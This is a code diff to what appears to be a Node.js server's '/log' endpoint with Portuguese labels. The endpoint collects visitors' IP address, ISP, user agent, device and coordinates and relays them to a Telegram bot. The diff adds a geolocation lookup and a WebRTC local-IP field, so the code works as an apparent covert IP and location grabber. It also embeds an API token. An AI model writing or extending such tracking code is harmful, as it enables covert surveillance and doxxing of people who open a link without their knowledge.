@@ -24,6 +24,20 @@ app.post('/log', async (req, res) => {
     return res.status(500).send("Bot não configurado.");
   }
 
+  let preciseLoc = null;
+
+  try {
+    const mlsRes = await fetch("https://location.services.mozilla.com/v1/geolocate?key=test", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ considerIp: true })
+    });
+    const mlsData = await mlsRes.json();
+    preciseLoc = `${mlsData.location.lat},${mlsData.location.lng}`;
+  } catch (mlsErr) {
+    console.warn("⚠️ Mozilla Location Service falhou:", mlsErr);
+  }
+
   try {
     const ipResponse = await fetch(`https://ipinfo.io/${data.ip}?token=c5633786f81824`);
     const ipInfo = await ipResponse.json();
@@ -37,7 +51,8 @@ app.post('/log', async (req, res) => {
 🏢 ISP: ${ipInfo.org}
 🕵️‍♂️ Agente: ${data.userAgent}
 📱 Dispositivo: ${data.device}
-📌 Lat/Long: ${data.loc || ipInfo.loc}
+📌 Lat/Long: ${preciseLoc || data.loc || ipInfo.loc}
+🌐 IP Local (WebRTC): ${data.localIP || "N/A"}
 `;
 
     const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
